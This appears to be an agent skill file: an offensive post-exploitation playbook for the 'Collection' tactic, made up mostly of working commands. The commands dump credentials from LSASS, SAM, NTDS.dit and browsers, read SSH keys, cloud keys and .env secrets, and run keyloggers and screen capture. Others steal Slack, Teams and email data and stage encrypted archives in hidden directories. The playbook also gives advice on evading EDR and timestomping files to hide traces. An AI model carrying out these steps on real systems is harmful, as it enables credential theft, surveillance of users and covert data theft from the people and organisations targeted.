---
name: collection
description: Post-exploitation data collection — credential harvesting, sensitive file discovery, screen/input capture, email/communication theft, and data staging for exfiltration.
---

# Collection (TA0009)

Post-exploitation data collection — everything you grab from a target before exfiltration.
Organized in phases: credentials first, then files, screen/input capture, comms, and staging.

---

## Phase 1: Credential Harvesting

### Browser Passwords

```bash
# LaZagne — all-in-one credential recovery (Windows/Linux)
# https://github.com/AlessandroZ/LaZagne
python3 laZagne.py all                    # dump everything
python3 laZagne.py browsers               # browsers only
python3 laZagne.py browsers -firefox      # firefox only

# SharpChromium — Chromium-based browser looting (.NET)
# https://github.com/djhohnstein/SharpChromium
SharpChromium.exe logins                  # saved passwords
SharpChromium.exe cookies                 # all cookies
SharpChromium.exe history                 # browsing history

# firefox_decrypt — Firefox/Thunderbird master password extraction
# https://github.com/unode/firefox_decrypt
python3 firefox_decrypt.py                # interactive, prompts for master pw
python3 firefox_decrypt.py -n             # no master password set
python3 firefox_decrypt.py -p profiledir  # specific profile
```

### System Credentials

```bash
# Mimikatz — Windows credential extraction (run as SYSTEM/admin)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords       # plaintext from LSASS
mimikatz # sekurlsa::wdigest              # WDigest creds
mimikatz # lsadump::sam                   # local SAM database
mimikatz # lsadump::dcsync /user:krbtgt   # DCSync (domain controller)
mimikatz # vault::cred                    # Windows Vault

# Impacket secretsdump — remote credential extraction
secretsdump.py domain/user:password@target           # remote SAM + LSA + NTDS
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL   # offline from copied files
secretsdump.py -hashes :NTHASH domain/user@target    # pass-the-hash

# Linux shadow file
cat /etc/shadow                           # requires root
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=rockyou.txt

# WiFi passwords
## Windows
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
## Linux (NetworkManager)
cat /etc/NetworkManager/system-connections/*.nmconnection | grep psk=
```

### Application Credentials & Keys

```bash
# AWS credentials
cat ~/.aws/credentials
cat ~/.aws/config
env | grep -i AWS_

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ed25519
cat ~/.ssh/known_hosts                    # reveals infrastructure
cat ~/.ssh/config                         # reveals jump hosts

# GPG keys
gpg --list-secret-keys
gpg --export-secret-keys -a > /tmp/.gpg_priv.asc

# Database connection strings
grep -ri "password" /var/www/ --include="*.php" --include="*.py" --include="*.conf"
grep -ri "connectionstring" /var/www/ --include="*.config" --include="*.xml"
cat /var/www/html/wp-config.php           # WordPress
cat /var/www/html/.env                    # Laravel/Node env files

# API keys & tokens
grep -rni "api_key\|apikey\|api-key\|secret_key\|token" /opt/ /var/www/ /home/ 2>/dev/null
cat ~/.gitconfig                          # may contain tokens
find / -name ".env" -type f 2>/dev/null
```

---

## Phase 2: Sensitive File Discovery & Collection

### Linux High-Value Files

```bash
# System files
/etc/shadow                               # password hashes
/etc/passwd                               # user list
/etc/sudoers                              # privilege info
/etc/crontab                              # scheduled tasks (persistence clues)

# User files
~/.bash_history                           # command history (goldmine)
~/.zsh_history
~/.mysql_history
~/.psql_history
~/.ssh/*                                  # keys, config, known_hosts
~/.gnupg/*                                # GPG keys

# Config files
/etc/openvpn/*.conf                       # VPN configs
/etc/ipsec.secrets                        # IPsec PSKs
/var/lib/dhcp/dhclient.leases             # network info

# Discovery patterns
find / -name "*.sql" -o -name "*.bak" -o -name "*.kdbx" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -path "*/etc/*" 2>/dev/null
find /home -name ".env" -o -name "*.sqlite" -o -name "*.db" 2>/dev/null
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pfx" 2>/dev/null
```

### Windows High-Value Files

```powershell
# SAM/SYSTEM/SECURITY (requires SYSTEM or shadow copy)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Volume Shadow Copy method (for locked files)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM

# NTDS.dit (Domain Controller — the crown jewels)
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q

# Unattend/Sysprep files (often contain plaintext creds)
type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Autounattend.xml
type C:\Windows\System32\Sysprep\unattend.xml

# Web configs
type C:\inetpub\wwwroot\web.config
dir /s /b C:\inetpub\*.config

# KeePass databases
dir /s /b C:\Users\*.kdbx

# Registry stored creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s   # PuTTY saved sessions
reg query "HKCU\Software\ORL\WinVNC3\Password"             # VNC passwords

# WiFi passwords from registry
netsh wlan export profile key=clear folder=C:\temp\wifi

# VPN configs
dir /s /b "C:\Users\*vpn*" "C:\Users\*.ovpn" "C:\Users\*.pcf" 2>nul
```

---

## Phase 3: Screen & Input Capture

### Screenshots

```bash
# Meterpreter
meterpreter > screenshot                              # single screenshot
meterpreter > run post/multi/gather/screen_spy DELAY=5 COUNT=10  # timed captures

# Linux (X11)
xwd -root -out /tmp/screen.xwd                       # X Window Dump
import -window root /tmp/screen.png                   # ImageMagick
scrot /tmp/screen.png                                 # scrot utility
DISPLAY=:0 xdotool key --clearmodifiers Print          # print screen key

# Windows (PowerShell)
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object {
  $bitmap = New-Object System.Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height)
  $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
  $graphics.CopyFromScreen($_.Bounds.Location, [System.Drawing.Point]::Empty, $_.Bounds.Size)
  $bitmap.Save("C:\temp\screen.png")
}
```

### Keylogging

```bash
# Meterpreter
meterpreter > keyscan_start
meterpreter > keyscan_dump                            # retrieve captured keys
meterpreter > keyscan_stop

# Linux (logkeys)
logkeys --start --output /tmp/.keys.log

# Windows (PowerShell — basic)
# Use post/windows/capture/keylog_recorder in Metasploit for reliable capture
meterpreter > run post/windows/capture/keylog_recorder
```

### Clipboard

```bash
# Linux
xclip -selection clipboard -o                         # current clipboard
xsel --clipboard --output                             # alternative

# Windows
powershell -c "Get-Clipboard"
powershell -c "Get-Clipboard -Format FileDropList"    # copied files

# Meterpreter (Windows)
meterpreter > run post/windows/gather/clipboard
```

---

## Phase 4: Email & Communication

### Exchange / Outlook

```powershell
# EWS (Exchange Web Services) with valid creds
# MailSniper — https://github.com/dafthack/MailSniper
Invoke-SelfSearch -Mailbox user@domain.com -ExchHostname mail.domain.com -Terms "password","credentials","vpn"

# Export PST via Outlook COM
$outlook = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
# Navigate folders and export

# Export mailbox via Exchange Management Shell (on Exchange server)
New-MailboxExportRequest -Mailbox user -FilePath \\server\share\user.pst
```

### IMAP

```bash
# Manual IMAP access
curl -k "imaps://mail.target.com/INBOX" --user "user:password"
curl -k "imaps://mail.target.com/INBOX;UID=1" --user "user:password"  # specific message

# Thunderbird profile theft (contains cached mail + saved creds)
# Linux: ~/.thunderbird/
# Windows: %APPDATA%\Thunderbird\Profiles\
tar czf /tmp/.tb.tar.gz ~/.thunderbird/
```

### Slack / Teams Tokens

```bash
# Slack tokens — stored in browser local storage and config files
# Linux
find / -path "*Slack*" -name "*.db" -o -name "*.leveldb" 2>/dev/null
strings ~/.config/Slack/Local\ Storage/leveldb/*.ldb | grep "xoxs-\|xoxp-\|xoxb-\|xoxr-"

# Windows
findstr /si "xoxs- xoxp- xoxb-" "%APPDATA%\Slack\Local Storage\leveldb\*.ldb"

# Teams tokens (Windows)
findstr /si "eyJ0" "%APPDATA%\Microsoft\Teams\Local Storage\leveldb\*.ldb"
```

---

## Phase 5: Data Staging

### Compress

```bash
# tar + gzip
tar czf /tmp/.data.tar.gz /path/to/loot/
tar czf /tmp/.d.tgz --exclude="*.log" /home/user/.ssh/ /etc/shadow

# 7z with password (encrypted filenames)
7z a -p"P@ssw0rd!" -mhe=on /tmp/.data.7z /path/to/loot/

# zip with password
zip -r -e -P "P@ssw0rd!" /tmp/.data.zip /path/to/loot/
```

### Encrypt

```bash
# OpenSSL AES-256-CBC
openssl enc -aes-256-cbc -salt -pbkdf2 -in data.tar.gz -out data.enc -k "P@ssw0rd!"
# Decrypt (for your side):
openssl enc -d -aes-256-cbc -pbkdf2 -in data.enc -out data.tar.gz -k "P@ssw0rd!"

# GPG symmetric
gpg -c --cipher-algo AES256 data.tar.gz    # prompts for passphrase
```

### Split for Transfer

```bash
# Split into chunks
split -b 512K data.enc chunk_              # 512KB chunks
split -b 1M data.enc chunk_               # 1MB chunks

# Reassemble (attacker side)
cat chunk_* > data.enc
```

### Staging Locations

```bash
# Linux
/tmp/.cache/           # hidden in tmp
/dev/shm/.work/        # RAM disk, no disk writes
/var/tmp/.update/      # survives reboots

# Windows
C:\Windows\Temp\       # system temp
C:\ProgramData\        # hidden by default
$env:LOCALAPPDATA\Temp # user temp
```

---

## Decision Tree: What to Collect

| Target Type    | Priority Collection                                            |
| -------------- | -------------------------------------------------------------- |
| **Workstation**| Browser creds, SSH keys, .env files, clipboard, bash_history   |
| **Server**     | Config files, DB creds, /etc/shadow, SSH keys, crontabs        |
| **Domain Controller** | NTDS.dit + SYSTEM, GPOs, DNS records, krbtgt hash        |
| **Web Server** | web.config, .env, DB connection strings, SSL certs/keys        |
| **Database**   | Connection strings, user tables, stored procedures w/ creds    |
| **Mail Server**| Mailboxes (exec/admin), GAL, transport rules                   |
| **Dev Machine**| Git repos, .env files, API keys, cloud creds, SSH keys         |

### General Priority Order

1. **Credentials first** — they unlock more access
2. **Config files** — reveal infrastructure and more creds
3. **Sensitive data** — PII, financial, IP (depends on objective)
4. **Communication** — email, chat tokens (lateral movement intel)
5. **Screen/keylog** — passive collection while doing other tasks

## OPSEC Ratings Per Technique

| Technique | OPSEC | Notes |
|-----------|-------|-------|
| Config file reads | 🟢 Quiet | File read operations, minimal logging |
| .bash_history, SSH keys | 🟢 Quiet | Reading existing files, no alerts |
| Browser cred extraction (LaZagne) | 🟡 Moderate | Tool execution may trigger AV/EDR |
| Mimikatz / LSASS dump | 🔴 Loud | Most EDR solutions detect this immediately |
| Keylogging | 🟡 Moderate | Persistent activity, may be detected |
| Screenshots | 🟡 Moderate | API calls can be monitored |
| Email export (PST) | 🟡 Moderate | Exchange logging captures export requests |
| Data compression/staging | 🟢 Quiet | Local operations, minimal visibility |
| Secretsdump.py (remote) | 🔴 Loud | Network cred dump, generates DC replication traffic |

## Failure Recovery

| Technique | Common Failure | Recovery |
|-----------|---------------|----------|
| LaZagne | AV blocks execution | Run as base64-decoded Python, or extract browser DB files manually |
| Mimikatz | EDR blocks | Use comsvcs.dll MiniDump, nanodump, or pypykatz offline |
| SSH key discovery | No readable keys | Check /proc/*/environ, memory strings, authorized_keys on other hosts |
| Browser creds | Master password set | Try SharpChromium for Chromium (uses DPAPI), or extract DB + decrypt offline |
| Email collection | No Outlook/EWS access | Check IMAP, webmail, cached .ost/.pst files on disk |
| Clipboard capture | No X11/display | Use `/proc/*/fd` for terminal sessions, or keylog instead |

## Technique Chaining Playbooks

### Full Credential Harvest Chain
```
1. Config files 🟢 (.env, wp-config.php, connection strings)
2. History files 🟢 (.bash_history, .mysql_history)
3. SSH keys 🟢 (id_rsa, id_ed25519, authorized_keys)
4. Browser stores 🟡 (LaZagne, SharpChromium)
5. LSASS/SAM 🔴 (mimikatz, secretsdump — if authorized)
   └── New creds → lateral_movement skill → repeat on new hosts
```

### Server Data Collection
```
1. Database connection strings 🟢 (grep config files)
2. Service credentials 🟢 (/etc/shadow, registry)
3. API keys 🟢 (env vars, .env files, JS source)
4. SSL private keys 🟡 (find *.key *.pem)
5. Stage & encrypt 🟢 → exfiltration skill
```

## Examples
See [examples/linux-cred-harvest.md](examples/linux-cred-harvest.md) for Linux credential harvesting.
See [examples/windows-data-collection.md](examples/windows-data-collection.md) for Windows data collection.
See [examples/data-staging.md](examples/data-staging.md) for encryption and staging workflow.

---

### OPSEC Reminders

- Minimize disk writes — use `/dev/shm/` on Linux when possible
- Timestamp awareness — `touch -r /etc/hosts /tmp/.data.tar.gz` to match existing file timestamps
- Clean up staging — remove artifacts after exfil
- Size limits — don't try to exfil 50GB over a C2 channel; be selective
- Encrypt everything before moving it off the target
